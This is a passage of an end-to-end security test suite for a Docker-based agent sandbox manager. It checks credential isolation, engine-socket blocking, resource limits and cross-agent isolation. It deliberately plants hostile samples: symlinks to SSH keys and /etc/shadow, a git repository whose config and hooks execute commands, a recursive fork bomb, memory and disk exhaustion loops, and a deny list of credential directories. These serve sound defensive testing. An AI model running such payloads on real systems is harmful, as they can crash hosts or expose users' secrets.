/**
 * "Pruefen der Haertung" (concept: Sicherheit und Policy) against the real Docker backend through the manager:
 * host files, engine socket, resource limits, agent isolation, policy tamper resistance, path canonicalisation,
 * hostile repositories, approvals, project-template trust and host rules.
 * Network and secrets live in security-network.test.ts / security-secrets.test.ts.
 */
import { execFileSync } from 'node:child_process';
import {
  chmodSync,
  existsSync,
  lstatSync,
  mkdirSync,
  readFileSync,
  readdirSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from 'node:fs';
import { createServer, type Server } from 'node:net';
import { userInfo } from 'node:os';
import { basename, join } from 'node:path';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';
import { AboxError, type Caller, type HostResolver } from '@abox/core';
import {
  A,
  B,
  DOCKER,
  HUMAN,
  HUMAN_YES,
  containerCount,
  createApproved,
  docker,
  dockerProvider,
  errorOf,
  gitHost,
  makeEnv,
  openAbox,
  out,
  sh,
  sleep,
  sweepE2E,
  warmProxy,
  withSandbox,
  type Ctx,
  type Env,
} from './harness.js';

// ---------------------------------------------------------------------------------------------------------------
// fixtures
// ---------------------------------------------------------------------------------------------------------------

const PROJECT_TEMPLATE = (extra = '', name = 'e2e-proj'): string => `apiVersion: 1
name: ${name}
description: A project template that came with a repository (untrusted until its content hash is approved).
backend: docker
base: { os: 'alpine:3.22' }
resources: { cpus: 1, memory: 256m, pids: 128, ttl: 30m }
network: { mode: none }
${extra}`;

interface Fixtures {
  linkapp: string;
  gitapp: string;
  evilrepo: string;
  evilMarker: string;
  trustapp: string;
  hostile: string;
  sockapp: string;
  sockServer: Server;
}

function lnk(target: string, path: string): void {
  symlinkSync(target, path);
}

async function makeFixtures(env: Env): Promise<Fixtures> {
  const { home, projects, datasets, aboxHome } = env;
  // lookalike directories of ~/.ssh (so that denial can only come from the name folding rules, not from absence)
  for (const d of ['.SSH', '.Ssh', '．ssh', '.ｓｓｈ', '.ssh/sub'])
    mkdirSync(join(home, d), { recursive: true });
  writeFileSync(join(home, '.ssh', 'sub', 'keep'), 'x');

  // 1. a project full of symlinks that point at host secrets
  const linkapp = join(projects, 'linkapp');
  mkdirSync(linkapp, { recursive: true });
  writeFileSync(join(linkapp, 'normal.txt'), 'plain file\n');
  writeFileSync(join(env.root, 'host-secret.txt'), `${env.sshMarker}\n`);
  lnk(join(home, '.ssh'), join(linkapp, 'link-abs'));
  lnk('../../.ssh', join(linkapp, 'link-rel'));
  lnk(join(home, '.ssh', 'id_ed25519'), join(linkapp, 'file-abs'));
  lnk('../../.ssh/id_ed25519', join(linkapp, 'file-rel'));
  lnk('../../.aws', join(linkapp, 'aws-rel'));
  lnk(join(env.root, 'host-secret.txt'), join(linkapp, 'host-secret'));
  lnk('/var/run/docker.sock', join(linkapp, 'sock-link'));
  lnk('/proc/1/root', join(linkapp, 'proc-root'));

  // 2. a git project (for the read-only .git test)
  const gitapp = join(projects, 'gitapp');
  mkdirSync(gitapp, { recursive: true });
  gitHost(gitapp, 'init', '-q');
  writeFileSync(join(gitapp, 'a.txt'), 'a\n');
  gitHost(gitapp, 'add', '-A');
  gitHost(gitapp, 'commit', '-q', '-m', 'init');

  // 3. a hostile repository: every config knob that makes git run a command is set
  const evilMarker = join(env.root, `pwned-${Date.now()}`); // each knob touches `${evilMarker}.<knob>`
  const evilrepo = join(projects, 'evilrepo');
  mkdirSync(evilrepo, { recursive: true });
  gitHost(evilrepo, 'init', '-q');
  writeFileSync(join(evilrepo, 'a.txt'), 'a\n');
  writeFileSync(join(evilrepo, '.gitattributes'), 'a.txt filter=evil diff=evil\n');
  gitHost(evilrepo, 'add', '-A');
  gitHost(evilrepo, 'commit', '-q', '-m', 'init');
  const t = (knob: string): string => `touch ${evilMarker}.${knob}`;
  writeFileSync(
    join(evilrepo, '.git', 'config'),
    `${readFileSync(join(evilrepo, '.git', 'config'), 'utf8')}
[core]
\tfsmonitor = ${t('fsmonitor')}
\tsshCommand = ${t('sshCommand')}
\tpager = ${t('pager')}
\teditor = ${t('editor')}
\thooksPath = .git/hooks
[filter "evil"]
\tclean = ${t('filter-clean')}
\tsmudge = ${t('filter-smudge')}
\tprocess = ${t('filter-process')}
[diff "evil"]
\ttextconv = ${t('diff-textconv')}
\tcommand = ${t('diff-command')}
[alias]
\tstatus = !${t('alias-status')}
`,
  );
  for (const hook of [
    'post-checkout',
    'post-merge',
    'pre-commit',
    'post-commit',
    'reference-transaction',
    'pre-push',
    'post-rewrite',
  ]) {
    writeFileSync(join(evilrepo, '.git', 'hooks', hook), `#!/bin/sh\n${t(`hook-${hook}`)}\n`, {
      mode: 0o755,
    });
  }

  // 4. project templates
  const trustapp = join(projects, 'trustapp');
  mkdirSync(join(trustapp, '.sandbox'), { recursive: true });
  writeFileSync(join(trustapp, '.sandbox', 'e2e-proj.yaml'), PROJECT_TEMPLATE());
  const hostile = join(projects, 'hostile');
  mkdirSync(join(hostile, '.sandbox'), { recursive: true });
  writeFileSync(
    join(hostile, '.sandbox', 'e2e-evil.yaml'),
    PROJECT_TEMPLATE(
      `mounts:\n  - { source: '~/.ssh', target: /stolen, access: ro }\n`,
      'e2e-evil',
    ),
  );
  // a project template that shadows a BUILTIN name: project > user > builtin in the lookup order
  writeFileSync(
    join(hostile, '.sandbox', 'alpine-min.yaml'),
    PROJECT_TEMPLATE(`setup:\n  - run: echo shadowed > /etc/e2e-shadow\n`, 'alpine-min'),
  );

  // 5. symlinks that point from the permitted root to forbidden places
  lnk(join(home, '.ssh'), join(projects, 'evil-link'));
  lnk(join(projects, 'chain2'), join(projects, 'chain1'));
  lnk(join(home, '.ssh'), join(projects, 'chain2'));
  lnk(join(home, '.ssh', 'sub'), join(projects, 'lnk'));
  lnk(join(aboxHome, 'config'), join(projects, 'to-config'));
  lnk(join(home, '.ssh'), join(datasets, 'lnk-ssh'));

  // 6. a project containing a real unix socket
  const sockapp = join(projects, 'sockapp');
  mkdirSync(sockapp, { recursive: true });
  writeFileSync(join(sockapp, 'a.txt'), 'a\n');
  const sockServer = createServer();
  await new Promise<void>((r) => sockServer.listen(join(sockapp, 's.sock'), r));

  return { linkapp, gitapp, evilrepo, evilMarker, trustapp, hostile, sockapp, sockServer };
}

/** Everything below `root` (regular files only, symlinks not followed) that contains `needle`. */
function filesContaining(root: string, needle: string): string[] {
  const hits: string[] = [];
  const walk = (d: string): void => {
    for (const n of readdirSync(d)) {
      const p = join(d, n);
      const st = lstatSync(p);
      if (st.isDirectory()) walk(p);
      else if (st.isFile() && readFileSync(p).includes(needle)) hits.push(p);
    }
  };
  walk(root);
  return hits;
}

interface Refusal {
  kind: 'error' | 'result';
  code?: string;
  message: string;
}

async function attempt(
  ctx: Ctx,
  caller: Caller,
  req: Parameters<Ctx['abox']['createSandbox']>[1],
): Promise<Refusal> {
  try {
    const r = await ctx.abox.createSandbox(caller, req, { waitForApprovalMs: 0 });
    if (r.status === 'created') ctx.created.push(r.sandbox.id);
    return { kind: 'result', message: r.status };
  } catch (e) {
    const err = e as AboxError;
    return { kind: 'error', code: err.code, message: err.message };
  }
}

const REFUSED = ['policy_denied', 'invalid_input'];

// ---------------------------------------------------------------------------------------------------------------

describe.skipIf(!DOCKER)('security: hardening checks (real Docker through the manager)', () => {
  let env: Env;
  let ctx: Ctx;
  let fx: Fixtures;

  beforeAll(async () => {
    env = makeEnv();
    fx = await makeFixtures(env);
    ctx = await openAbox(env);
    await ctx.abox.buildTemplate(HUMAN, 'alpine-min');
    await warmProxy(ctx);
  }, 300_000);

  afterAll(async () => {
    fx?.sockServer.close();
    await ctx?.close();
    await sweepE2E();
    env?.cleanup();
  }, 180_000);

  // =================================================================================================================
  describe('the sandbox cannot read ~/.ssh', () => {
    it('a mount request for ~/.ssh and the other credential directories is denied (agent and human, deny wins)', async () => {
      const before = await containerCount(ctx);
      for (const dir of [
        '.ssh',
        '.aws',
        '.gnupg',
        '.config',
        '.kube',
        '.docker',
        '.netrc',
        '.git-credentials',
        '.npmrc',
        '.mozilla',
        '.local/share/keyrings',
        '.password-store',
      ]) {
        const source = join(env.home, dir);
        mkdirSync(source, { recursive: true });
        for (const caller of [A, HUMAN_YES]) {
          const r = await attempt(ctx, caller, {
            template: 'alpine-min',
            workspace: { mode: 'empty' },
            overrides: { mounts: [{ source, target: '/mnt/x' }] },
          });
          expect(r, `${caller.contextId} ${dir}`).toMatchObject({
            kind: 'error',
            code: 'policy_denied',
          });
        }
      }
      expect(await containerCount(ctx)).toBe(before);
    });

    it('a workspace request for ~/.ssh is denied in every mode', async () => {
      for (const mode of ['copy', 'mount', 'clone', 'worktree'] as const) {
        const r = await attempt(ctx, A, {
          template: 'alpine-min',
          workspace: { mode, path: join(env.home, '.ssh') },
        });
        expect(r, mode).toMatchObject({ kind: 'error', code: 'policy_denied' });
      }
    });

    for (const mode of ['copy', 'mount'] as const) {
      it(`symlinks inside the workspace do not expose host files (workspace mode ${mode})`, async () => {
        await withSandbox(
          ctx,
          A,
          { template: 'alpine-min', workspace: { mode, path: fx.linkapp } },
          async (id, c) => {
            if (mode === 'copy') expect(c.warnings.join(' ')).toMatch(/symlink/i); // the user is told that links point outside
            const probe = [
              'cd /workspace',
              'for p in link-abs link-rel file-abs file-rel aws-rel host-secret sock-link proc-root; do',
              '  echo "== $p"; ls -la "$p" 2>&1 | head -3; cat "$p" 2>&1 | head -3; ls "$p/" 2>&1 | head -5; cat "$p/id_ed25519" "$p/credentials" 2>&1 | head -3',
              'done',
              'echo normal=$(cat normal.txt)',
            ].join('\n');
            const r = await sh(ctx, A, id, probe);
            expect(r.stdout, 'marker leaked').not.toContain(env.sshMarker);
            expect(r.stdout).toContain('normal=plain file');
            // a recursive search that FOLLOWS symlinks finds the marker nowhere in the sandbox
            const g = await sh(
              ctx,
              A,
              id,
              `grep -RIF '${env.sshMarker}' / --exclude-dir=proc --exclude-dir=sys --exclude-dir=dev 2>/dev/null | head -3; echo done`,
              { timeoutMs: 90_000 },
            );
            expect(g.stdout.trim()).toBe('done');
            // and the engine socket behind sock-link is not there either
            expect(
              (await sh(ctx, A, id, 'ls -L /workspace/sock-link 2>&1; echo rc=$?')).stdout,
            ).not.toMatch(/rc=0/);
            // /workspace/proc-root points at the sandbox's own /proc/1/root (not the host's)
            expect(
              (await sh(ctx, A, id, 'ls /workspace/proc-root/home 2>&1 | head -3')).stdout,
            ).not.toContain(userInfo().username);
          },
        );
      }, 180_000);
    }

    it('a symlink planted BY the sandbox (mount mode, rw) is never followed by export and is flagged', async () => {
      const proj = join(env.projects, 'plant');
      mkdirSync(proj, { recursive: true });
      writeFileSync(join(proj, 'a.txt'), 'a\n');
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'mount', path: proj } },
        async (id) => {
          await sh(
            ctx,
            A,
            id,
            `ln -s '${join(env.home, '.ssh', 'id_ed25519')}' /workspace/stolen-key; ln -s ../../.ssh /workspace/stolen-dir; echo new > /workspace/new.txt`,
          );
          const exp = await ctx.abox.exportSandbox(A, id, { format: 'files' });
          const link = exp.files.find((f) => f.path === 'stolen-key');
          expect(link, JSON.stringify(exp.files)).toMatchObject({ kind: 'symlink' });
          expect(exp.flagged.map((f) => f.path)).toEqual(expect.arrayContaining(['stolen-key']));
          expect(filesContaining(exp.outDir!, env.sshMarker)).toEqual([]);
          // the exported listing is data, not a follow-up read: nothing outside outDir was touched
          expect(readFileSync(join(env.home, '.ssh', 'id_ed25519'), 'utf8')).toContain(
            env.sshMarker,
          );
        },
      );
    });

    it('the host-side bind mount is exactly the workspace: no other binds, no engine socket, .git read-only', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'mount', path: fx.gitapp } },
        async (id) => {
          const short = id.split('/')[1]!;
          const ins = JSON.parse(
            (await docker(['inspect', `abox-local-${short}`])).stdout,
          ) as Array<{
            Mounts: Array<{ Type: string; Source: string; Destination: string; RW: boolean }>;
            HostConfig: { Binds: string[] | null };
          }>;
          const binds = ins[0]!.Mounts.filter((m) => m.Type === 'bind');
          expect(binds.map((m) => [m.Source, m.Destination, m.RW]).sort()).toEqual(
            [
              [fx.gitapp, '/workspace', true],
              [join(fx.gitapp, '.git'), '/workspace/.git', false],
            ].sort(),
          );
          expect(JSON.stringify(ins[0]!.Mounts)).not.toMatch(
            /docker\.sock|containerd|\/proc|\/sys|\/etc\b/,
          );
          // writes to .git fail; ordinary files can be changed and the change is on the host (that is what `mount` means)
          const r = await sh(
            ctx,
            A,
            id,
            [
              'cd /workspace',
              'echo "#!/bin/sh" > .git/hooks/post-checkout; echo hook=$?',
              'echo "[core]" >> .git/config; echo config=$?',
              'rm -rf .git; echo rm=$?',
              'mv .git .git2; echo mv=$?',
              'ln -sf /etc/passwd .git/HEAD; echo ln=$?',
              'echo changed > a.txt; echo file=$?',
            ].join('\n'),
          );
          for (const k of ['hook', 'config', 'rm', 'mv', 'ln'])
            expect(r.stdout, `${k}: ${r.stdout}`).not.toContain(`${k}=0`);
          expect(r.stdout).toContain('file=0');
          expect(readFileSync(join(fx.gitapp, 'a.txt'), 'utf8')).toBe('changed\n');
          expect(existsSync(join(fx.gitapp, '.git', 'hooks', 'post-checkout'))).toBe(false);
          gitHost(fx.gitapp, 'checkout', '--', 'a.txt');
        },
      );
    }, 120_000);
  });

  // =================================================================================================================
  describe('the engine socket is not reachable', () => {
    it('no docker.sock (or similar) inside the sandbox, no engine mount, no host namespaces', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: env.app } },
        async (id) => {
          const r = await sh(
            ctx,
            A,
            id,
            'ls -l /var/run/docker.sock /run/docker.sock /var/run/podman /run/containerd 2>&1; echo rc=$?',
          );
          expect(r.stdout).not.toMatch(/rc=0/);
          expect(
            (await sh(ctx, A, id, 'find / -xdev -type s 2>/dev/null | head')).stdout.trim(),
          ).toBe('');
          expect((await sh(ctx, A, id, 'cat /proc/self/mountinfo')).stdout).not.toMatch(
            /docker\.sock|containerd\.sock|podman\.sock|\/run\/user/,
          );
          const ins = JSON.parse(
            (await docker(['inspect', `abox-local-${id.split('/')[1]}`])).stdout,
          ) as Array<{ HostConfig: Record<string, unknown>; Mounts: unknown[] }>;
          expect(ins[0]!.HostConfig).toMatchObject({
            Privileged: false,
            PidMode: '',
            IpcMode: 'private',
            UTSMode: '',
            UsernsMode: '',
            NetworkMode: 'none',
          });
          expect(ins[0]!.Mounts).toEqual([]);
        },
      );
    });

    it('requests that would bring the engine socket in are denied: mounts, workspaces, symlink targets, sockets in a tree', async () => {
      for (const source of [
        '/var/run/docker.sock',
        '/run/docker.sock',
        '/var/run',
        '/run',
        '/var/run/podman/podman.sock',
        `/run/user/${process.getuid?.() ?? 1000}`,
      ]) {
        for (const caller of [A, HUMAN_YES]) {
          const r = await attempt(ctx, caller, {
            template: 'alpine-min',
            workspace: { mode: 'empty' },
            overrides: { mounts: [{ source, target: '/mnt/sock' }] },
          });
          expect(r, `${caller.contextId} mount ${source}`).toMatchObject({ kind: 'error' });
          expect(REFUSED).toContain(r.code);
        }
      }
      // a real socket anywhere in a mounted tree is refused (mount mode binds the tree)
      const mounted = await attempt(ctx, A, {
        template: 'alpine-min',
        workspace: { mode: 'mount', path: fx.sockapp },
      });
      expect(mounted, JSON.stringify(mounted)).toMatchObject({
        kind: 'error',
        code: 'policy_denied',
      });
      expect(mounted.message).toMatch(/socket/i);
      // a dataset mount of a tree with a socket as well
      mkdirSync(join(env.datasets, 'withsock'), { recursive: true });
      const srv = createServer();
      await new Promise<void>((r) => srv.listen(join(env.datasets, 'withsock', 'x.sock'), r));
      try {
        const m = await attempt(ctx, A, {
          template: 'alpine-min',
          workspace: { mode: 'empty' },
          overrides: { mounts: [{ source: join(env.datasets, 'withsock'), target: '/data' }] },
        });
        expect(m).toMatchObject({ kind: 'error', code: 'policy_denied' });
      } finally {
        srv.close();
      }
    });

    it('a sandbox with a copy of a tree containing a socket gets no working socket (sockets are not copied)', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: fx.sockapp } },
        async (id) => {
          expect((await sh(ctx, A, id, 'find /workspace -type s | wc -l')).stdout.trim()).toBe('0');
        },
      );
    });
  });

  // =================================================================================================================
  describe('fork bombs and memory hogs are contained by limits (sandbox stays manageable, host unaffected)', () => {
    it('the pids limit caps a fork storm: cgroup, docker top and the manager agree, fork() really fails', async () => {
      const id = (await ctx.create(A, { template: 'alpine-min', workspace: { mode: 'empty' } }))
        .sandbox.id;
      try {
        const short = id.split('/')[1]!;
        const cid = (
          await docker(['inspect', '--format', '{{.Id}}', `abox-local-${short}`])
        ).stdout.trim();
        // a background process that starts 600 sleepers; it dies when fork() fails at the limit
        const p = await ctx.abox.startProcess(
          A,
          id,
          {
            command:
              'i=0; while [ $i -lt 600 ]; do sleep 120 & i=$((i+1)); done 2>/tmp/forkerr; sleep 120',
          },
          { waitForApprovalMs: 0 },
        );
        expect(p.status).toBe('started');
        await sleep(4000);
        const cg = `/sys/fs/cgroup/system.slice/docker-${cid}.scope`;
        if (existsSync(join(cg, 'pids.max'))) {
          expect(readFileSync(join(cg, 'pids.max'), 'utf8').trim()).toBe('128');
          const cur = Number(readFileSync(join(cg, 'pids.current'), 'utf8').trim());
          expect(cur).toBeLessThanOrEqual(128);
          expect(cur, 'the storm should have reached the limit').toBeGreaterThan(100);
        }
        const top =
          (await docker(['top', `abox-local-${short}`, '-eo', 'pid'])).stdout.trim().split('\n')
            .length - 1;
        expect(top).toBeLessThanOrEqual(130);
        expect(top).toBeGreaterThan(100);
        // inside the full cgroup nothing can start any more (exec needs a pid) - the limit bites the sandbox, not the host
        const e = await errorOf(sh(ctx, A, id, 'echo still-alive', { timeoutMs: 15_000 }));
        const alive = e === undefined;
        expect(alive || (e as Error).message.length > 0).toBe(true);
        // still manageable from outside: inspect, stop, remove
        expect((await ctx.abox.inspectSandbox(A, id)).state).toBe('running');
        const t0 = Date.now();
        await ctx.abox.stopSandbox(A, id);
        expect(Date.now() - t0).toBeLessThan(30_000);
        expect((await ctx.abox.inspectSandbox(A, id)).state).toBe('stopped');
      } finally {
        await ctx.abox.removeSandbox(HUMAN, id).catch(() => undefined);
        ctx.created.splice(ctx.created.indexOf(id), 1);
      }
    }, 180_000);

    it('a real recursive fork bomb is contained: the manager can still list, stop and remove, and the engine stays responsive', async () => {
      const id = (await ctx.create(A, { template: 'alpine-min', workspace: { mode: 'empty' } }))
        .sandbox.id;
      const short = id.split('/')[1]!;
      // The bomb can exhaust the pids limit before abox's own start wrapper finishes; then
      // startProcess reports a fork failure. Both outcomes are fine - what matters is the
      // containment checked below.
      try {
        const p = await ctx.abox.startProcess(
          A,
          id,
          { command: 'f() { f | f & }; f' },
          { waitForApprovalMs: 0 },
        );
        expect(p.status).toBe('started');
      } catch (e) {
        expect((e as Error).message).toMatch(/fork|Resource temporarily unavailable/i);
      }
      await sleep(4000);
      const top =
        (await docker(['top', `abox-local-${short}`, '-eo', 'pid'])).stdout.trim().split('\n')
          .length - 1;
      expect(top, 'processes inside the bombed sandbox').toBeLessThanOrEqual(130);
      const t0 = Date.now();
      expect(
        (await docker(['info', '--format', '{{.ServerVersion}}'], { timeoutMs: 20_000 })).code,
      ).toBe(0);
      expect((await ctx.abox.listSandboxes(A)).sandboxes.some((s) => s.id === id)).toBe(true);
      await ctx.abox.removeSandbox(A, id);
      ctx.created.splice(ctx.created.indexOf(id), 1);
      expect(Date.now() - t0).toBeLessThan(60_000);
      expect(
        (await docker(['ps', '-a', '-q', '--filter', `name=abox-local-${short}`])).stdout.trim(),
      ).toBe('');
    }, 180_000);

    it('a memory hog is OOM-killed inside its cgroup; the sandbox survives and the limit is exactly the configured one', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'empty' } },
        async (id) => {
          const lim = await sh(
            ctx,
            A,
            id,
            'cat /sys/fs/cgroup/memory.max /sys/fs/cgroup/memory.swap.max',
          );
          expect(lim.stdout.trim().split('\n')).toEqual([String(256 * 1024 * 1024), '0']);
          // string doubling: allocates until the cgroup kills it
          const r = await sh(ctx, A, id, 'a=xxxxxxxxxxxxxxxx; while :; do a="$a$a"; done', {
            timeoutMs: 60_000,
          });
          expect(r.exitCode, out(r)).not.toBe(0);
          expect(r.timedOut).toBe(false);
          const ev = await sh(ctx, A, id, 'cat /sys/fs/cgroup/memory.events');
          expect(Number(/oom_kill (\d+)/.exec(ev.stdout)?.[1])).toBeGreaterThan(0);
          // sandbox is still up and usable
          expect((await sh(ctx, A, id, 'echo alive')).stdout.trim()).toBe('alive');
          expect((await ctx.abox.inspectSandbox(A, id)).state).toBe('running');
        },
      );
    }, 180_000);

    it('/tmp is a size-limited tmpfs: filling it fails with ENOSPC instead of eating memory without bound', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'empty' } },
        async (id) => {
          const r = await sh(
            ctx,
            A,
            id,
            'dd if=/dev/zero of=/tmp/fill bs=1M count=400 2>&1; df -k /tmp | tail -1',
            { timeoutMs: 60_000 },
          );
          expect(r.stdout).toMatch(/No space left/i);
          const sizeKb = Number(/tmpfs\s+(\d+)/.exec(r.stdout)?.[1]);
          expect(sizeKb).toBeLessThanOrEqual(128 * 1024);
        },
      );
    }, 120_000);

    it('the TTL is enforced: an expired sandbox is stopped by the sweep, cannot run commands and cannot be restarted', async () => {
      const w = makeEnv();
      const c = await openAbox(w, { fakeClock: true });
      try {
        const sb = await c.create(A, {
          template: 'alpine-min',
          workspace: { mode: 'empty' },
          overrides: { ttl: '10m' },
        });
        const id = sb.sandbox.id;
        expect((await sh(c, A, id, 'echo ok')).stdout.trim()).toBe('ok');
        // extending beyond the profile's total lifetime limit (2h) is denied; within it is fine
        expect(
          await errorOf(c.abox.extendTtl(A, id, '3h', { waitForApprovalMs: 0 })),
        ).toMatchObject({ code: 'policy_denied' });
        w.clock.offset += 11 * 60_000;
        await c.abox.sweepTtl(HUMAN); // (every manager call also sweeps; the explicit call just makes it deterministic)
        expect((await c.abox.inspectSandbox(A, id)).expired).toBe(true);
        const short = id.split('/')[1]!;
        await sleep(1500);
        expect(
          (
            await docker(['inspect', '--format', '{{.State.Running}}', `abox-local-${short}`])
          ).stdout.trim(),
        ).toBe('false');
        expect(await errorOf(sh(c, A, id, 'echo nope'))).toMatchObject({ code: 'conflict' });
        expect(await errorOf(c.abox.startSandbox(A, id))).toMatchObject({ code: 'conflict' });
        // gc removes it (human operator function)
        const gc = await c.abox.gc(HUMAN, {});
        expect(gc.sandboxes).toContain(id);
        expect(
          (await docker(['ps', '-a', '-q', '--filter', `name=abox-local-${short}`])).stdout.trim(),
        ).toBe('');
      } finally {
        await c.close();
        w.cleanup();
      }
    }, 180_000);
  });

  // =================================================================================================================
  describe('container hardening defaults hold in the running sandbox', () => {
    it('no new privileges, no capabilities, seccomp, no devices, private namespaces, no host processes', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: env.app } },
        async (id) => {
          const short = id.split('/')[1]!;
          const ins = JSON.parse(
            (await docker(['inspect', `abox-local-${short}`])).stdout,
          ) as Array<{
            HostConfig: Record<string, unknown>;
            Config: { User: string };
          }>;
          expect(ins[0]!.HostConfig).toMatchObject({
            Privileged: false,
            CapDrop: ['ALL'],
            SecurityOpt: ['no-new-privileges:true'],
            PidsLimit: 128,
            Memory: 256 * 1024 * 1024,
            MemorySwap: 256 * 1024 * 1024,
            ReadonlyRootfs: false,
            PublishAllPorts: false,
            Devices: [],
          });
          expect(ins[0]!.HostConfig['CapAdd'] ?? null).toBeNull();
          expect(ins[0]!.Config.User).toBe('1000:1000');
          const r = await sh(
            ctx,
            A,
            id,
            [
              'echo ps=$(ps | wc -l)',
              'echo devs=$(ls /dev | wc -l)',
              'unshare -r true 2>&1; echo unshare=$?',
              'chroot / true 2>&1; echo chroot=$?',
              'echo 1 > /proc/sys/kernel/panic 2>&1; echo procsys=$?',
              'echo x > /sys/kernel/uevent_helper 2>&1; echo sys=$?',
              'ls /dev/mem /dev/kmsg /dev/sda /dev/nvme0n1 2>&1 | head -2',
              'cat /proc/1/cmdline | tr "\\0" " "',
            ].join('\n'),
          );
          expect(Number(/ps=(\d+)/.exec(r.stdout)?.[1])).toBeLessThan(12); // own pid namespace: init, sleep, the shell
          expect(Number(/devs=(\d+)/.exec(r.stdout)?.[1])).toBeLessThan(25);
          for (const k of ['unshare', 'chroot', 'procsys', 'sys'])
            expect(r.stdout, `${k}:\n${r.stdout}`).not.toContain(`${k}=0`);
          expect(r.stdout).not.toMatch(/systemd|\/sbin\/init/);
        },
      );
    });

    it('the container cannot see or write the host through the workspace copy', async () => {
      await withSandbox(
        ctx,
        A,
        { template: 'alpine-min', workspace: { mode: 'copy', path: env.app } },
        async (id) => {
          await sh(
            ctx,
            A,
            id,
            'echo sandbox-edit > /workspace/README.md; echo x > /workspace/new-in-sandbox.txt',
          );
          expect(readFileSync(join(env.app, 'README.md'), 'utf8')).toBe(
            'hello from the e2e project\n',
          );
          expect(existsSync(join(env.app, 'new-in-sandbox.txt'))).toBe(false);
        },
      );
    });
  });

  // =================================================================================================================
  describe('a stopped sandbox is read with the permissions of the sandbox user', () => {
    it('/etc/shadow and links to it are refused after sandbox_stop, just like while running; the workspace stays readable', async () => {
      const id = (
        await ctx.create(A, {
          template: 'alpine-min',
          workspace: { mode: 'copy', path: env.app },
        })
      ).sandbox.id;
      try {
        await sh(ctx, A, id, 'ln -s /etc/shadow /workspace/shadow-link; ln -s /etc /workspace/etc');
        const probe = async (): Promise<void> => {
          for (const p of ['/etc/shadow', '/workspace/shadow-link', '/workspace/etc/shadow']) {
            expect(await errorOf(ctx.abox.readFile(A, id, p)), p).toMatchObject({
              code: 'policy_denied',
            });
          }
          expect(await errorOf(ctx.abox.listDir(A, id, '/root'))).toMatchObject({
            code: 'policy_denied',
          });
          expect(
            (await ctx.abox.readFile(A, id, '/workspace/README.md')).content.length,
          ).toBeGreaterThan(0);
          expect((await ctx.abox.listDir(A, id, '/workspace')).map((e) => e.name)).toContain(
            'README.md',
          );
        };
        await probe();
        await ctx.abox.stopSandbox(A, id);
        expect((await ctx.abox.inspectSandbox(A, id)).state).toBe('stopped');
        await probe();
      } finally {
        await ctx.abox.removeSandbox(HUMAN, id).catch(() => undefined);
        const i = ctx.created.indexOf(id);
        if (i >= 0) ctx.created.splice(i, 1);
      }
    }, 120_000);
  });

  // =================================================================================================================
  describe('agent context A cannot see or influence the sandboxes of context B', () => {
    let a = '';
    let b = '';
    beforeAll(async () => {
      a = (
        await ctx.create(A, {
          template: 'alpine-min',
          workspace: { mode: 'copy', path: env.app },
          name: 'a-box',
        })
      ).sandbox.id;
      b = (
        await ctx.create(B, {
          template: 'alpine-min',
          workspace: { mode: 'copy', path: env.app },
          name: 'b-box',
        })
      ).sandbox.id;
      await ctx.abox.writeFile(A, a, '/workspace/private.txt', 'only for A');
    }, 120_000);

    it('every operation on a foreign sandbox answers not_found (never policy_denied: no existence oracle) and changes nothing', async () => {
      const ops: Array<[string, () => Promise<unknown>]> = [
        ['inspect', () => ctx.abox.inspectSandbox(B, a)],
        ['exec', () => ctx.abox.exec(B, a, { argv: ['id'] })],
        ['start', () => ctx.abox.startSandbox(B, a)],
        ['stop', () => ctx.abox.stopSandbox(B, a)],
        ['remove', () => ctx.abox.removeSandbox(B, a)],
        ['readFile', () => ctx.abox.readFile(B, a, '/workspace/private.txt')],
        ['writeFile', () => ctx.abox.writeFile(B, a, '/workspace/evil.txt', 'x')],
        ['listDir', () => ctx.abox.listDir(B, a, '/workspace')],
        ['export', () => ctx.abox.exportSandbox(B, a, { format: 'diff' })],
        ['snapshot', () => ctx.abox.snapshot(B, a, 'snap')],
        ['restore', () => ctx.abox.restore(B, a, 'snap')],
        ['extendTtl', () => ctx.abox.extendTtl(B, a, '30m')],
        [
          'accessRequest',
          () => ctx.abox.accessRequest(B, a, { kind: 'ttl', details: { ttl: '30m' } }),
        ],
        ['startProcess', () => ctx.abox.startProcess(B, a, { argv: ['sleep', '1'] })],
        ['listProcesses', () => ctx.abox.listProcesses(B, a)],
      ];
      for (const [name, op] of ops)
        expect(await errorOf(op()), name).toMatchObject({ code: 'not_found' });
      // identical to a sandbox that does not exist
      const ghost = (await errorOf(ctx.abox.inspectSandbox(B, 'local/deadbeef'))) as AboxError;
      const real = (await errorOf(ctx.abox.inspectSandbox(B, a))) as AboxError;
      expect(real.code).toBe(ghost.code);
      expect(real.message.replace(a, 'X')).toBe(ghost.message.replace('local/deadbeef', 'X'));
      // nothing happened to A's sandbox
      expect((await ctx.abox.inspectSandbox(A, a)).state).toBe('running');
      expect((await ctx.abox.readFile(A, a, '/workspace/private.txt')).content).toBe('only for A');
      expect(
        await ctx.abox
          .listDir(A, a, '/workspace')
          .then((l) => l.some((e) => e.name === 'evil.txt')),
      ).toBe(false);
    });

    it("lists, filters, logs, approvals and audit show only a context's own things", async () => {
      expect((await ctx.abox.listSandboxes(A)).sandboxes.map((s) => s.id)).toEqual(
        expect.arrayContaining([a]),
      );
      expect((await ctx.abox.listSandboxes(A)).sandboxes.map((s) => s.id)).not.toContain(b);
      expect((await ctx.abox.listSandboxes(B)).sandboxes.map((s) => s.id)).not.toContain(a);
      expect(
        (await ctx.abox.listSandboxes(B, { owner: 'agent:agent-a' })).sandboxes.map((s) => s.id),
      ).not.toContain(a);
      expect((await ctx.abox.listSandboxes(B)).orphans).toEqual([]);
      const x = await sh(ctx, A, a, 'echo secret-output-of-a');
      expect(await errorOf(ctx.abox.readLog(B, x.logRef))).toMatchObject({ code: 'not_found' });
      // B's probes are audited (without the sandbox id column) and invisible to A
      const probes = await ctx.abox.queryAudit(HUMAN, { action: 'sandbox.lookup' });
